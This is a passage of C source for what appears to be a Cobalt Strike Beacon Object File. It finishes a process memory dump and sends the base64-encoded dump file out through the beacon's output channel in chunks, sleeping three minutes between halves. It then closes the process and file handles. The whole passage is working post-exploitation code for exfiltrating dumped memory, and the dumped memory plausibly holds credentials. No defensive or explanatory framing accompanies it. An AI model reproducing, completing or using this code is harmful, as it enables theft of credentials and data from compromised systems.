		outputLength = outputLength + 1;
		isOdd = 1;
		}
		
		//Split outputLength in half
		int splitOutputLength = outputLength / 2;
		
		//If output was originally even
		if ( isOdd != 1 ) {
		
			//Send first half
			for (; ((splitOutputLength - CurLen) - ChkLen) >= 0 && CurLen < splitOutputLength; CurLen += ChkLen) {
			MSVCRT$memcpy(toSend, base64returnDataString, ChkLen);
			BeaconPrintf(CALLBACK_OUTPUT, "%s", toSend);
			MSVCRT$memset(toSend, 0, size);
			base64returnDataString = (char*)base64returnDataString + ChkLen;
    			};
    			
    			//Sleep 3 min and let CS catch up
    			KERNEL32$Sleep (180000);
    			
    			//Send second half
    			for (; ((outputLength - CurLen) - ChkLen) >= 0 && CurLen < outputLength; CurLen += ChkLen) {
			MSVCRT$memcpy(toSend, base64returnDataString, ChkLen);
			BeaconPrintf(CALLBACK_OUTPUT, "%s", toSend);
			MSVCRT$memset(toSend, 0, size);
			base64returnDataString = (char*)base64returnDataString + ChkLen;
    			};
    			
		}
		else
		{
		
			outputLength = outputLength - 1;
			
			//Send first half
			for (; ((splitOutputLength - CurLen) - ChkLen) >= 0 && CurLen < splitOutputLength; CurLen += ChkLen) {
			MSVCRT$memcpy(toSend, base64returnDataString, ChkLen);
			BeaconPrintf(CALLBACK_OUTPUT, "%s", toSend);
			MSVCRT$memset(toSend, 0, size);
			base64returnDataString = (char*)base64returnDataString + ChkLen;
    			};
    			
    			//Sleep 3 min and let CS catch up
    			KERNEL32$Sleep (180000);
    		
    			//Send second half
    			for (; ((outputLength - CurLen) - ChkLen) >= 0 && CurLen < outputLength; CurLen += ChkLen) {
			MSVCRT$memcpy(toSend, base64returnDataString, ChkLen);
			BeaconPrintf(CALLBACK_OUTPUT, "%s", toSend);
			MSVCRT$memset(toSend, 0, size);
			base64returnDataString = (char*)base64returnDataString + ChkLen;
    			};
    		}
	}
	else
	{	
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Data Exfiltration might Take A Few Minutes So Be Patient...\n");
		//Less than 100 MB so we just send the whole dump file
    		for (; ((outputLength - CurLen) - ChkLen) >= 0 && CurLen < outputLength; CurLen += ChkLen) {
		MSVCRT$memcpy(toSend, base64returnDataString, ChkLen);
		BeaconPrintf(CALLBACK_OUTPUT, "%s", toSend);
		MSVCRT$memset(toSend, 0, size);
		base64returnDataString = (char*)base64returnDataString + ChkLen;
    		};
	}
	}
	
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Dump completed\n");
	
	 //Close Handles
        status = NtClose(hProc);
        status = NtClose(tFile);
        status = NtClose(hFile);
	
	//Free memory
	MSVCRT$free(baseAddress);
	}
}
